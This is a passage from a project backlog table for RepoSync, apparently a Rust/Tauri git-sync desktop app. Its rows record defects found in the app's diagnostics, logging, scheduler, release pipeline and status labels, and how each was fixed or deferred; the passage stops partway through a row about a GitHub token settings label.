| BL-NI-61 (copied diagnostics and receipts carry local paths) | Two copy actions emit absolute local paths verbatim: Settings -> Diagnostics "Copy details" (data / database / log directories) and the activity receipt's Copy - `raw_command` is built as `{git_exe} -C {repo_path} {args}` in `crates/reposync-core/src/git/cli.rs:104`, so every receipt carries the repository's full path. On Windows these contain the account name and any private directory names above the repo. Both are deliberate - a redacted path defeats the Diagnostics card's primary job of finding a folder, and BL-NI-54 ratified leaving paths and repo names intact because they ARE the diagnostic value - and both are now labelled at the copy button. Worth revisiting only if a public issue template asks users to paste either. Options: a second "copy without paths" action, or `%LOCALAPPDATA%`-style collapsing in the copied text only (NOT in the stored row, which must keep agreeing with the log file). | Raised while building the Diagnostics card (2026-08-04); sharpened by the Codex adversarial review of that branch, whose stronger remedy (drop the raw streams from the copy, re-run the redactor at copy time) was REJECTED: the streams ARE the receipt, and a frontend re-redaction needs a second, drifting TypeScript copy of the Rust redactor and recreates exactly the split-brain BL-NI-54 rejected when it put redaction at capture. What WAS taken from that finding is the wording - the receipt footer no longer claims credentials are stripped, full stop. | watch |
| BL-NI-62 (scheduler counters reset on every launch) | The Diagnostics card's cycles / repos-checked / outcome-write-failure counters live in process memory (`SchedulerHealthCounters`), so they reset each launch. That is the right default - they answer "is this session healthy" - but it means a failure pattern that only shows up over days is invisible unless the user happens to look before restarting. The log file already carries the durable record (`scheduler.outcome_persist_failed`), so this only matters if the card ever becomes the primary diagnosis surface. Would want a persisted counter or a log-derived rollup rather than a bigger in-memory structure. | Raised while wiring BL-NI-14's `TickReport` into the Diagnostics card (2026-08-04). | watch |
| BL-NI-63 (no runtime logging-health signal) | `Diagnostics.logging_active` is `LogConfig.is_some()`, which proves only that the subscriber INSTALLED at startup. `tracing_appender::non_blocking` writes on a worker thread and exposes no error channel or dropped-event counter, so a disk that fills, an ACL that changes, or a worker that dies after launch leaves the flag `true` while nothing reaches disk - hiding exactly the incident evidence the logging effort exists to produce. MITIGATED BUT NOT CLOSED 2026-08-04: `log_dir_stats` now distinguishes an UNREADABLE directory from an empty one, and the card flags the observable contradiction ("logging started but the folder contains no log files"). That catches a folder that vanished or became unreadable; it does NOT catch a write failing while the folder still looks fine. The real fix is a counting `MakeWriter` wrapping the appender that records io errors plus a last-failure time into managed state, reported as a state SEPARATE from `logging_active`. Deferred because it touches the startup logging path, which is load-bearing for the white-screen class of failure, and wants its own verification rather than riding along on a UI change. **DONE 2026-08-07.** A `CountingWriter` now decorates the rolling appender, and its placement is forced rather than chosen: it has to sit BETWEEN the appender and `tracing_appender::non_blocking`, because `non_blocking` consumes the writer and returns an opaque handle, and the subscriber above that never sees an io error at all. Wrapping at either other layer would count nothing, which is why the row called this a shape change. It records io errors with a timestamp and NEVER swallows them: a decorator that altered the error path would be a worse bug than the blindness it fixes, since the appender's own rotation and retry depend on seeing them. **The less obvious half is `bytes_written`, and it is the more important one.** Zero failures is equally consistent with "everything works" and "nothing was ever written", and only the second is a problem, so a failure counter alone would have reproduced the exact ambiguity this row exists to remove. A non-zero byte count is positive evidence that the whole path (subscriber, worker thread, file) carried something, which is the claim `logging_active` looks like it is making and is not. Surfaced as three additive `Diagnostics` fields, a "Log writes" row on the card, and a line in the copyable report; the card's warning list gained a direct failure warning ordered ABOVE the existing empty-folder inference, because a non-zero failure count has exactly one meaning while an empty folder has several. The old file-count check is kept as a backstop for the case where writes were accepted and the file went away anyway. `logging_active` is deliberately left alone and still means what it always meant; the point was never to fix that flag but to stop it being the only signal. Four tests, including one asserting the error still propagates. | Codex adversarial review of the diagnostics branch (2026-08-04), finding 2. | done 2026-08-07 |
| BL-NI-64 (`last_error_code` was a dead column) | `repo_local_state.last_error_code` was declared in migration `0001_init.sql`, read by `store::repo_list`, `store::repo_get`, and `summary`'s needs-attention query (`WHERE rls.last_error_code IS NOT NULL OR rls.is_dirty = 1`), and **written by nothing in production**. The only write anywhere in the tree was `seed_state`, a raw-SQL helper inside `summary`'s own `#[cfg(test)]` block. Consequences: the error half of the attention rule could never fire, so a repo that had been failing to fetch for a week was surfaced only if it also happened to be dirty; and `repo_list` / `repo_get` returned `lastErrorCode: null` to the GUI forever, so the frontend status taxonomy in `src/lib/status.ts` ranked against a permanently empty field. The one place that computed a correct code, the edge's private `status_error_code`, put it on the `repo:state-changed` event and not into the database, which is why the live event looked right while every subsequent read of the same fact returned NULL. FIXED 2026-08-07: the classifier moved to `policy::status_error_code` as the single source of truth, and all three writers now persist it (`check_now`, `run_update_inner`, and the scheduler's `DbOutcomeWriter::record`), clearing it to NULL on a healthy outcome. The edge now delegates to the same function rather than owning a copy, so the event payload and the persisted column agree by construction instead of by coincidence. Boundary recorded deliberately: only OPERATIONAL failures write a code. A policy skip does not - "dirty" and "detached" are the designed outcome of a rule the user chose, are already represented by their own columns, and writing them here would make the attention query count one repo through both halves of its condition. | Found by the 2026-08-07 reconnaissance pass over the open backlog rows; verified directly against the tree before acting. | done 2026-08-07 |
| BL-NI-65 (a test that seeds the value its production path fails to produce) | The class of defect that hid BL-NI-64, recorded separately because it is not specific to that column. `summary::tests::attention_counts_error_or_dirty_state_rows` is a correct query test and a misleading coverage signal: it seeds `last_error_code` with raw SQL through a `#[cfg(test)]` helper, so it proved the query could READ a value that nothing in production ever WROTE, and it passed for months while the feature was inert. The general shape is a fixture that supplies exactly the input the code under test is failing to generate, which makes the test agree with the code about a fact neither one establishes. Partial mitigation shipped with BL-NI-64: `summary::tests::attention_fires_on_state_the_real_outcome_writer_produced` drives the scheduler's real `DbOutcomeWriter` and reads back through `summary_today`, so it spans the seam the defect lived in. Open question, not actioned: whether other `#[cfg(test)]` seeding helpers in this crate hide the same shape. A sweep would ask, for each raw-SQL test helper, "which production function is supposed to write this, and does any test make it do so." **Open question ANSWERED 2026-08-07, negative result.** Swept the whole workspace for columns written inside `#[cfg(test)]` regions but never in production code. Nine candidates came back and all nine are false positives, each checked by hand: `etag` and `description` are written by an `ON CONFLICT ... DO UPDATE SET x = excluded.x` upsert in `github.rs`, `default_branch` by `SET default_branch = COALESCE(?, default_branch)`, and `created_at` / `local_name` / `local_path` / `host_type` / `remote_origin_url` by `repo.rs::add`'s multi-line INSERT. `last_error_code` itself appeared, which is the sanity check that the sweep detects the shape at all. **Conclusion: BL-NI-64 was the only genuine instance in this codebase.** Recorded so nobody repeats the sweep. Worth keeping for whoever does write a mechanical version of this check: the three write forms that defeat a naive `col = ?` search are `col = excluded.col`, `col = COALESCE(?, col)`, and a column list broken across lines by a string continuation. The row stays open only for the broader principle, not for an outstanding sweep. | Generalized from the BL-NI-64 root cause, 2026-08-07. | open (as a principle; the concrete sweep is done and found nothing further) |
| BL-NI-66 (the release pipeline has never completed a run) | The `Release` workflow has exactly one run in this repository's history: run `28745508241` for tag `v0.9.0` on 2026-07-05. **It FAILED.** Both matrix jobs (`release (windows-latest)` and `release (macos-latest)`) failed in 3-4 seconds with **zero steps executed**, the signature of a workflow-level startup failure before any step ran, which matches the Actions billing gate that was open on the personal-account repository at that date and was resolved only by the 2026-07-17 move to the paid `prisant-labs` org. Four consequences, none of them previously recorded anywhere: (1) the Windows installers attached to the `v0.9.0` release were NOT produced by the pipeline, so the release page does not prove the pipeline works; (2) **no macOS artifact has ever been published**, even though `release.yml` has carried `macos-latest` in its matrix since before the tag, which is why the release carries only `RepoSync_0.9.0_x64-setup.exe` and `RepoSync_0.9.0_x64_en-US.msi`; (3) the entire `preflight` job - the tag-reachable-from-main gate, the four-version-source assertion, the CHANGELOG assertion, the updater config-hygiene check - has never executed once, so it is a gate that has never been made to pass, let alone made to fail; (4) `release.yml` itself still carries an explicit note that how its updater args thread through (Tauri CLI vs cargo passthrough) needs confirming against a real run. Proposed and NOT taken without a human yes: a `workflow_dispatch` entry point with a `dry_run` input that runs `preflight` plus the full both-OS build and bundle while hard-skipping every publishing step, converting "never proven" into evidence on both platforms without cutting anything. Held because editing the release pipeline is the one place a mistake stays invisible until the next real release. **RESOLVED 2026-08-14, jp ruled: build the dry-run lane.** `workflow_dispatch` added to `release.yml`, and it is ALWAYS a dry run. It was designed with a `dry_run` boolean input defaulting to true; that was dropped because a boolean is a thing that can be flipped, and the only reason to flip it would be to publish from a manual dispatch, which is what the tag-only trigger exists to prevent. Making the TRIGGER the mode removes the switch instead of defaulting it, and `github.event_name` cannot be set by whoever starts the run. The dry run shares ONE code path with the real cut rather than being a parallel copy, because a copy would prove the copy works. The two diverge at exactly one step per job. Workflow permissions dropped to `contents: read` with `contents: write` granted only to the job that can create a Release, so preflight now runs read-only. The dry run runs `pnpm tauri build --profile dist` directly rather than `tauri-action`, so no input or misconfiguration can publish, and no `GITHUB_TOKEN` reaches that step. **What a dry run cannot prove is stated in the run's own summary rather than left implied:** that the four versions match a TAG (with no tag, `tauri.conf.json` is the reference so its own comparison is a tautology), tag ancestry from main, Release creation and asset upload, and signed `latest.json` emission. **RUN FOR THE FIRST TIME 2026-08-16** (run `31930948351`). `release preflight` PASSED end to end in 11 minutes, so the tag-ancestry gate, the four-version-source assertion, the CHANGELOG assertion, the SECURITY.md check, the full quality tier, the bindings-staleness check, the core-purity gate and the updater config hygiene check have all now executed at least once and all pass. Both build jobs FAILED in under a minute, on a real defect the lane existed to find: see BL-NI-81. That is the lane paying for itself on its first run. | Found 2026-08-07 while reconciling the public-facing docs; verified against the GitHub Actions run history and the `v0.9.0` release assets. | done 2026-08-16 (run once; preflight passes, and the run immediately found BL-NI-81) |
| BL-NI-67 (structured events had no test proving they fire) | The core's most important failure paths are best-effort by design: `activity::record` swallows a write error so a logging hiccup never aborts the git operation that already happened, and the scheduler absorbs a job that vanished. In each case **the log line is the ONLY trace that anything went wrong**, and nothing asserted that the line is emitted. `activity`'s own test said as much in a comment - "Reaching the next line without a panic IS the assertion" - which covers the easy half (no panic) and leaves the half that matters (the diagnostic reached a subscriber) unchecked. A `record` that swallowed the error AND failed to log would have passed. DONE 2026-08-07: added a `tracing` capture harness at `crates/reposync-core/src/logging.rs` (`capture::install`), hand-rolled from the FACADE's own `Subscriber` and `Visit` traits because `tracing-subscriber` is banned from this crate's tree (it pulls `time`; `cargo tree -p reposync-core` is the CI gate), so the obvious test writer was unavailable. It captures `event = ...` names WITH their level, because a failure demoted to `debug` vanishes from a default-filtered log while still passing a name-only assertion. Thread-local via `set_default`, so concurrent tests cannot see each other's events; the consequence to know is that a `flavor = "multi_thread"` test moves work to workers that do not inherit the thread-local. The harness is itself tested first, since a capture that silently sees nothing would make every assertion written against it vacuous, and vacuous assertions read as coverage. Used to strengthen `activity::record_is_best_effort_and_never_aborts_on_write_error` (plus its inverse, so an unconditional log would not satisfy it) and to add `scheduler::a_panicking_job_does_not_abort_the_cycle` (plus its inverse). | Recon pass 2026-08-07 over test and gate depth. | done 2026-08-07 |
| BL-NI-68 (`TickReport` cannot represent a vanished job, deliberately) | Recorded because it looks like a gap and is a decision, so the next reader does not "fix" it. A scheduled job that panics produces a `JoinError`, is logged as `scheduler.job_aborted`, and appears NOWHERE in `TickReport`: `ran` counts it (it was selected and run), `persist_failures` correctly does not (it never reached the writer), and `is_clean()` therefore returns true for a cycle in which a job died. The tick loop's own comment gives the reason and it is sound: the release profile sets `panic = "abort"`, so a shipped build cannot reach that arm at all, and **a structured field no production run can ever populate reads as coverage it does not have** - the same principle as BL-NI-14's, applied in the opposite direction. So the log line IS the contract here, and the test added under BL-NI-67 asserts the log line rather than lobbying for a field. The one residual nit, NOT actioned: `is_clean()`'s doc comment says "whether every job that ran also recorded its outcome", which is exactly true in a shipped build and slightly overclaims in a debug run where the abort arm is reachable. | Found 2026-08-07 while writing the panicking-job test, whose first draft asserted `ran == 2` and was wrong. | watch (documented decision, no action) |
| BL-NI-69 (`should_backoff` is a rate-limit guard nothing calls) | `github::should_backoff` is `pub`, fully implemented (backs off at or below `RATE_LIMIT_BACKOFF_PERCENT` of the limit, with a saturating multiply specifically to handle the high default a missing header produces), unit-tested across four cases, and referenced by three doc comments that describe it as what "the orchestrator" or "the edge" uses. **It has no production caller.** Grepping the workspace finds only its definition, its own tests, and prose. The same defect shape as BL-NI-64 (the dead column): a mechanism built, documented as wired, tested in isolation, and connected to nothing, where the tests pass precisely because they exercise it directly. What DOES stop a refresh pass today is the reactive path: `fetch_repo` classifies a response as `RepoFetch::RateLimited` when the status is 403 AND `remaining <= 0`, and `refresh_pass` breaks on that outcome. So RepoSync stops only once GitHub has already refused it, never before. **NARROWED 2026-08-22: this row previously said "the proactive guard AC4 describes is absent in practice", and that was stated more broadly than what had been established.** A proactive guard is NOT absent. `RateBudgeter` caps aggregate GitHub usage at `MAX_REQUESTS_PER_HOUR` (30) per rolling hour against the unauthenticated 60/hour ceiling; it is constructed via `shared_budgeter()` in `src-tauri/src/lib.rs`, held in `AppState`, and shared between the background pass and the manual refresh so neither can race the other past the cap. The E-17 plan says as much itself: mitigate "primarily with the hard request budgeter", with `should_backoff` as a further backstop. What is absent is that SPECIFIC header-driven backstop, not proactive protection. This matters because it changes the fix. Read as "we have no proactive rate protection", the row implies urgent wiring; the truth is "a second, redundant, header-driven backstop was built, documented in four places as wired, and never connected", which makes DELETING it as defensible as wiring it. Same defect family as this row documents, applied to the row itself: a claim broader than its evidence. **The four false comments were corrected 2026-08-22** (they said the orchestrator or the edge feeds `should_backoff`; nothing does), so what remains open here is only the wire-or-delete ruling. NOT fixed here, deliberately: wiring it is a behavior change (it makes the app stop fetching while requests are still being accepted, and the right threshold and resume policy are a product call), so it belongs in its own change with its own review rather than riding along on a test-only PR. Whoever takes it should decide three things: whether proactive backoff is wanted at all given the personal-library request volume, whether it pauses the pass or just the current repo, and how the pass resumes. | Found 2026-08-07 via the adversarial review of the test-depth PR, which correctly challenged a comment claiming this function governed the behavior under test. | open |
| BL-NI-70 (a check-all fans out one full-library refetch per repo) | `useBackendEvents` refetches the whole library on every `repo:check-completed`, and the tray's "Check All Now" emits one per repository, so a 40-repo burst produces 40 full `repo_list` + membership refetches. **Pre-existing, not introduced by BL-NI-04:** successful checks have always emitted that event and always caused the fan-out. What BL-NI-04 changed is that FAILED checks now emit it too, so the one case that used to be quiet (a network outage, where every check failed and none emitted) now behaves like every other case. The scheduled path already solved this exact problem and the solution is documented in `useBackendEvents`: a scheduler cycle emits ONE `scheduler:tick` after its jobs join, and the aggregate screens deliberately key off that instead of the per-repo events, precisely to avoid fanning an N-repo cycle into N+1 refetches. A manual check-all is the same shape and has no equivalent. Options, none taken: emit a `check-all:completed` event the aggregate screens key off (mirroring `scheduler:tick`), or debounce the aggregate refetch in `useBackendEvents` on a short trailing window. The second is smaller and also helps any other burst; the first is more honest about what happened. Not urgent: the refetches are local SQLite reads, so the cost is wasted work rather than a hang, and the screen ends up correct either way. **DONE 2026-08-07,** with the smaller of the two options the row named. `useBackendEvents` now runs the aggregate refetch through a 250 ms trailing debounce, so a burst of per-repo completion events collapses into one refetch while a single manual check behaves exactly as before. `scheduler:tick` is deliberately NOT debounced: it is already one event per cycle by design, and routing it through the window would only add latency to the path built to avoid this problem in the first place. Taken now rather than later because BL-NI-41 made it sharper: a concurrent check-all compresses the same storm from a slow trickle into a couple of seconds. The larger option, a dedicated `check-all:completed` event that the aggregate screens key off the way they already key off `scheduler:tick`, is still the more honest design and is still not taken, because it changes the event contract for a problem the debounce solves at no contract cost. | Surfaced by the adversarial review of PR #45 (BL-NI-04), which correctly noted the widening even though the underlying fan-out predates it. | done 2026-08-07 |
| BL-NI-71 (dropped log events are invisible, by design) | Recorded so BL-NI-63's counters are not read as proving more than they do. `tracing_appender::non_blocking` defaults to LOSSY (`is_lossy: true`, confirmed in the vendored source): when its bounded channel fills, it DROPS events rather than blocking the caller. A dropped event never reaches the `CountingWriter` at all, so it costs no bytes and raises no failure, and BL-NI-63's counters read perfectly healthy while output is being lost. **The trade is correct and should be kept:** blocking a git operation so a log line can be written would be worse than losing the line, and the alternative (`lossy(false)`) exerts backpressure on whatever thread emitted the event, which for this app means the scheduler. So the accurate reading is that BL-NI-63 answers "is the WRITER working", not "did every event reach disk"; those are different questions and only the first is answerable cheaply. Closing the second would need the dropped-event count, which the crate tracks internally but does not expose in the pinned version, so it is a dependency question rather than something this codebase can fix. Not urgent: the buffer is large relative to this app's event rate (a tray utility logging a handful of lines per scheduler cycle), so overflow would take a pathological burst. Revisit if a future `tracing-appender` exposes the counter, or if a user ever reports a log with visible gaps. **CLOSED 2026-08-07, same day, because the premise was WRONG.** This row was filed claiming the pinned crate does not expose a dropped-event count. The adversarial review of the BL-NI-63 branch corrected that, and it was right: `tracing-appender 0.2.5` publicly exposes `NonBlocking::error_counter()` and `ErrorCounter::dropped_lines()` (verified in the vendored source). So the gap was closable rather than merely documentable. `dropped_lines` is now captured at init and surfaced as its own `Diagnostics` field, its own card row, its own warning, and its own line in the copyable report. It is kept SEPARATE from `log_write_failures` deliberately: a write failure is the disk refusing, a dropped line is RepoSync choosing to lose output rather than stall the work that produced it, and only the first suggests a broken machine. Collapsing them would send someone to check permissions on a folder that is working correctly. Lossy mode itself is KEPT, and that part of the original row stands: the alternative exerts backpressure on the emitting thread, which here means stalling a git operation so a log line can be written. The lesson worth keeping is narrower than the row: the instinct to document a limit instead of fixing it was right in shape and wrong in fact, because the fact was assumed rather than checked against the dependency's source. | Found 2026-08-07 while writing BL-NI-63, by checking what the counter could NOT see rather than only what it could. | done 2026-08-07 |
| BL-NI-72 (a scheduled job classifies failures against a STALE failure count) | `scheduler::run_job` calls `classify_failure(repo.consecutive_failures, outcome)` using the count SNAPSHOTTED by the due query (`scheduler.rs`, the `DueRepo` built at selection time), not the count as it stands when the job finally acquires the repo's mutex and runs. Those are different values whenever anything else touched the repo in between, and something else routinely does: `check_now` and `update_now` both CLEAR the failure streak on success, under the same per-repo mutex the job is waiting on. **The user-visible consequence is a false auto-pause.** A repo sitting at two consecutive failures is selected as due; a manual check or a tray "Check All Now" wins the mutex first, succeeds, and resets the count to zero; the scheduled job then runs with its stale snapshot of two, hits one transient failure, computes 2+1=3, and persists `auto_paused = 1`. The repo silently stops being checked despite having demonstrably recovered a moment earlier, and the three-strikes rule fires on one real failure. PRE-EXISTING, not introduced by BL-NI-41: the serial check-all loop held one repo mutex at a time and so exposed at most one overlapping repo per moment. BL-NI-41's bounded admission keeps that exposure at the concurrency cap rather than the whole library, which is why the widening was fixed there and the underlying race is filed here. **Proposed fix:** re-read the failure count AFTER the mutex is acquired rather than trusting the selection-time snapshot. `run_job` has no pool (it is generic over the `OutcomeWriter` seam), so the natural shape is a method on that trait, e.g. `async fn current_failures(&self, repo: RepoId) -> Result<i64, AppError>`, implemented against the pool by `DbOutcomeWriter` and against stored state by the fake, with the snapshot kept as the fallback if the read fails. The alternative is a version-checked conditional write. Deserves its own change and its own review rather than riding along on a concurrency PR: it alters when a repo gets paused, which is the safety behavior users notice most. **Test it must have:** due-selection at two failures, an intervening successful manual check, then a failing scheduled run that must persist ONE failure and must NOT auto-pause. **DONE 2026-08-07,** same day it was filed. `run_job` now re-reads the count through a new `OutcomeWriter::current_failures` before classifying, instead of trusting the due-query snapshot. The method lives on the writer because `run_job` is deliberately pool-free: the persistence seam is the only participant that can read the row. It takes the whole `DueRepo` rather than an id so the test fake can fall back to the snapshot, which is what leaves all 340 pre-existing scheduler tests meaning exactly what they meant. **A separate read is sufficient and does not need a transaction:** every writer of a repo's failure state holds that repo's mutex (verified across `check_now`, `update_now`, the retry command, the check-all fan-out, and `run_job` itself), and the job is holding it, so the read-classify-write is already atomic against every other RepoSync writer. A failed read falls back to the snapshot rather than aborting, which is exactly the old behavior and never worse than it: refusing to classify because a bookkeeping read failed would turn a stale number into a lost check. The regression test was verified to FAIL against the old code, reporting `left: AutoPaused, right: Retry { consecutive_failures: 1 }` - the false auto-pause reproduced precisely as described. **Scope of the atomicity claim, narrowed after review:** the read-classify-write is atomic WITHIN ONE PROCESS, because `RepoLocks` is an in-memory map. Nothing stops a user launching RepoSync twice against the same WAL database, and a second instance could write between the read and the write. Making this one read-modify-write database-atomic was considered and NOT done: two instances would also run concurrent git in the same working tree, double the concurrency cap, and interleave activity rows, so hardening one counter would buy a false sense of safety while the more dangerous half stayed. The singleton guard is the real fix and is filed as BL-NI-73. | Found by the adversarial review of PR #50 (BL-NI-41), which correctly identified that eager fan-out widened a race rather than creating one. | done 2026-08-07 |
| BL-NI-73 (nothing stops two RepoSync instances sharing one database) | There is no single-instance guard anywhere in `src-tauri` (no `tauri-plugin-single-instance`, no lock file, no named mutex), and `db.rs` opens SQLite in WAL mode, which is designed for exactly this kind of shared access. So a user who launches RepoSync twice, or whose launcher does, gets two processes running two schedulers over one database. **The consequences are broad, not narrow.** `RepoLocks` is an in-memory `Arc<HashMap<..>>`, so the per-repo mutex that serializes a manual check against a scheduled one serializes ONE PROCESS only: two instances would run two `git` processes in the same working tree concurrently, which is the exact condition the lock exists to prevent and which can corrupt an index. They would also double the global concurrency cap, interleave activity rows, both fire notifications for the same event, and race every read-modify-write on `repo_local_state` including the failure counter BL-NI-72 just fixed within-process. Surfaced by the adversarial review of that fix, which correctly observed that its atomicity argument holds only inside one process. **Deliberately not fixed as part of BL-NI-72:** making that one read-modify-write database-atomic (a `BEGIN IMMEDIATE` or a compare-and-swap retry inside `OutcomeWriter`) would harden a single counter while leaving concurrent `git` in one working tree untouched, which is the more dangerous half and would then look addressed. The real fix is a startup singleton: `tauri-plugin-single-instance` focusing the existing window instead of starting a second app, which is also the behavior a tray user expects. **NOT unattended-safe, same class as BL-NI-53:** a singleton guard changes what happens at launch, and getting it wrong means the app does not start at all, which no gate in this repo can see. It needs a paired packaged verification (launch, launch again, confirm the first window focuses and no second tray icon appears). | Adversarial review of PR #51 (BL-NI-72), 2026-08-07. | open (needs a paired packaged verification; not unattended-safe) |
| BL-NI-74 (Diagnostics names the canonical database even when the app is using a fallback) | `build_diagnostics` always reports `paths.db_path()` as `db_path`, but `AppState.pool` is not necessarily connected to that file: when an unopenable database cannot be moved aside, `init_pool_with_recovery` opens a fallback sibling and the app runs on that instead. The card, and the "Copy details" text a user pastes into a bug report, then name the file the app is NOT writing to. The practical harm is specific rather than cosmetic: someone acting on that report inspects, backs up, replaces, or deletes the corrupt original while the database holding all current writes goes unmentioned. Independent of BL-NI-51's fix and true on `main` today; BL-NI-51 would make it matter more by turning fallback operation into a long-lived mode rather than a per-launch accident. **Fix:** carry the ACTIVE database path out of `DbInit` into `AppState` and report THAT as `db_path`, exposing the canonical path as a separate field when the two differ, so the panel can say "running on X; the usual location Y could not be opened" rather than quietly naming the wrong one. Small on its own, but it should land with or after BL-NI-51 rather than before, since the two disagree about what "the database" means and fixing the label first would describe a state the selection logic is about to change. | Adversarial review of PR #53 (BL-NI-51), 2026-08-07. | open |
| BL-NI-75 (the recency ordering used COALESCE where it meant MAX) | `store::recent_repos` ordered by `COALESCE(s.last_updated_at, s.last_checked_at, r.created_at, 0)`. `COALESCE` returns the first NON-NULL value, not the greatest, so **once a repo had ever been updated, every later check was invisible to the ordering**: a repo updated last week and checked seconds ago ranked BELOW one merely checked yesterday, in a list whose entire contract is "most recent activity first". Pre-existing and independent of BL-NI-40, but found by its review and fixed alongside it, because a submenu that refreshes correctly against a wrong order is not an improvement. Now `MAX(COALESCE(last_updated_at, 0), COALESCE(last_checked_at, 0), COALESCE(created_at, 0))`. The regression test is deliberately DATABASE-level rather than a `select_recent` unit test: the pure ranking function was always correct given the right input, and the bug lived entirely in the SQL, so only a test that goes through the query could see it. Verified to fail against the old expression, reporting the two repos in exactly the inverted order described above. | Found by the adversarial review of PR #55 (BL-NI-40), 2026-08-07. | done 2026-08-07 |
| BL-NI-76 (the Dashboard's attention hint claims a rule the query does not implement) | The "Need attention" stat tile in `src/screens/dashboard.tsx` carries the hint `"dirty, failed, behind"`. The rule that produces the number, in `summary.rs`, is `WHERE rls.last_error_code IS NOT NULL OR rls.is_dirty = 1`. Behind-ness is not part of it; `summary.rs` never references `behind` at all. So the label promises a third input the count does not have. **This is not cosmetic under the default configuration.** `repos.update_mode` defaults to `fetch_only`, which fetches without fast-forwarding, so a repo that falls behind stays behind indefinitely rather than being cleaned up on the next cycle. Observed on the maintainer's own library, 13 repos, 2026-08-14: `crit` at 161 commits behind and `claude-usage` at 65, both clean and error-free, are badged "Behind" on the Repos screen by `deriveStatus` and are absent from a Dashboard attention count of 5 whose every member is there for `is_dirty`. **Two defensible fixes and they are opposite**, which is why this is filed rather than patched: add `behind_count > 0` to the attention rule (the count moves 5 to 7 and the label becomes true), or drop "behind" from the hint (attention keeps meaning "act on this" and behind-ness stays on the Repos screen where it has its own badge). A threshold variant reopens BL-TQ-03 (E-07 attention threshold), which was deferred for this reason. Needs the maintainer's product call, not an agent's. **RESOLVED 2026-08-14, jp ruled: fix the label, keep the rule.** The hint now reads "dirty or failed". Behind stays out because `fetch_only` is the default and deliberately never touches the working tree, so behind is the designed steady state of a watched library rather than an anomaly, and folding it in would make the number permanently non-zero and stop it meaning "act on this". A `summary.rs` test now pins the exclusion IN WORDS, so anyone adding behind-ness to the rule has to delete an assertion explaining why it was left out and can then go fix the label to match. Verified to fail against the mutation: adding `OR rls.behind_count > 0` to the query fails exactly that one test and no other. | Found while preparing the 2026-08-14 UX feedback pass, verified against `summary.rs`, `dashboard.tsx`, `lib/status.ts`, and the live database. | done 2026-08-14 |
| BL-NI-77 (a deleted upstream is invisible on every summary surface) | A repo whose tracked upstream branch has been deleted is correctly SKIPPED rather than failed by `policy::decide` (`SkipReason::DeletedUpstream`, code `git.deleted_upstream`), and the skip is recorded with activity status `success`. Nothing else ever surfaces it. It sets no `last_error_code` and no `is_dirty`, so the attention rule in `summary.rs` cannot see it; `deriveStatus` in `src/lib/status.ts` has no state for "upstream gone" and falls through to `sync`, so the Repos badge reads **"In sync"** for a repo that structurally cannot sync. The only surface carrying the truth is an Activity receipt the user would have to already suspect something to open. Observed on the maintainer's own library, 2026-08-14: `awesome-claude-skills` on branch `add-pm-skills` has an empty `upstream_branch` and has recorded this outcome **39 consecutive times over ten days**, every one of them green. Same defect family as BL-NI-42 and the receipt-footer overclaim: a surface asserting a state it has not established. **Three options, all reasonable:** treat it as attention (it reaches the Dashboard with the reason code as its detail); give it a seventh status state so the badge stops saying "In sync" (a new token and icon, and DESIGN.md's taxonomy grows); or accept it as correct, on the grounds that a deleted upstream is usually a branch the user finished with. The middle option is the smallest change that removes the untrue statement. Needs a product call. **DECIDED 2026-08-14, jp ruled: give it its own status state**, without pushing it to the Dashboard attention count. Not yet implemented, because scoping it turned up a fork worth a second ruling. The engine ALREADY models this correctly: `policy::UpstreamState` is a three-state enum (`Tracking` / `None` / `Deleted`), and `classify_upstream` disambiguates them by whether an `origin` remote exists, since both no-upstream and deleted-upstream report `upstream_branch = None` from inspect. So this is the same three-states-collapsed-to-one shape as the git availability bug, one layer up: the engine knows, the wire type carries nothing, and the UI defaults to the most reassuring value. The classification is computed at check time from LIVE git reads and is not persisted, so `RepoSummary` cannot currently express it. Two ways to fix, and they differ in fidelity rather than effort: (a) DERIVE it in `repo_list` from `upstream_branch IS NULL AND NOT is_detached AND repos.remote_origin_url IS NOT NULL`, which needs no migration but substitutes a URL captured at add time for the live `has_origin_remote` read, so the two disagree if a remote is removed later; or (b) PERSIST the engine's own verdict in a new `repo_local_state.upstream_state` column written at check time, which is exactly faithful and costs a migration. (b) is the one consistent with this repo's carry-the-observation rule; (a) is the one that avoids a schema change. **BUILT 2026-08-15, jp ruled: persist (option b).** Migration `0008` adds `repo_local_state.upstream_state`, written on every `check_now` and `update_now` from the SAME `classify_upstream` verdict the policy engine decided over, so the row records what the engine acted on rather than a reconstruction. NULLABLE with no default on purpose: a backfill would be a classification no check ever made, so NULL means not-observed and resolves on the repo's next check. `UpstreamState` carries the serde and specta derives directly rather than being mirrored into `ipc`, because a second enum would need a `From` impl plus a test pinning two string mappings together, which is one more place for one fact to grow two representations that drift; a test pins `as_db_str` against the serde spelling instead. The frontend gains a seventh status state `noUpstream`, ranked below dirty and failed (this was scoped to stop the badge lying, not to escalate the repo) and above behind and ahead (those describe a comparison that has no base here). Its own teal token at hue 200 rather than reusing `paused`'s neutral: the two look similar in weight but mean opposite things about responsibility, and sharing a color invites reading "this stopped working" as "you turned this off". **A null `upstreamState` falls through to the old derivation, which on a clean repo lands on "sync", and that is a knowing choice rather than an oversight:** claiming "no upstream" from an absent observation would badge the entire library as broken the moment the migration lands and before anything is re-checked. Verified against mutations rather than trusted for being green: removing the `deriveStatus` branch fails exactly 3 of 27 frontend tests, and removing the column from the `check_now` UPDATE fails the slow-tier test with `left: None, right: Some("deleted")`, which is the dead-column shape of BL-NI-42 caught before it could ship again. | Found while preparing the 2026-08-14 UX feedback pass, verified against `policy.rs`, `summary.rs`, `lib/status.ts`, and 39 live activity rows. | done 2026-08-15 |
| BL-NI-78 (the Settings GitHub token row describes a keychain V1 never writes to) | `src/screens/settings.tsx` renders an Integrations row labelled "GitHub token" with the hint *"Stored in the OS keychain, never on disk. Managed outside this screen."* In V1 the token provider is `github::NoToken`, whose `token()` returns `None` with a `TODO(V1.1)` for the keyring-backed implementation; `github_token_present` is a derived flag that `store::settings_set` explicitly does not write, and nothing else does either. The row can therefore only ever read "not set", the keychain it names has never been written to, and there is no "outside this screen" where a token could be managed. Confirmed against the live database (`github_token_present = 0`). The harm is not functional, since the row is read-only, but it is a **security surface making a false statement about where credentials are kept**, in a public repo, which is the same class of problem the 2026-08-04 adversarial review caught in the Activity receipt footer and which `docs/security-model.md` was already careful about. **Options:** hide the row until BL-V11-02 (keyring PAT) lands, which also loses the visible signal that RepoSync runs against GitHub's unauthenticated 60 requests/hour limit; or reword it to state the V1 truth and keep the rate-limit fact where it is useful. Rewording looks strictly better and costs nothing, but the copy is the maintainer's call. **RESOLVED 2026-08-15, reworded.** The hint now 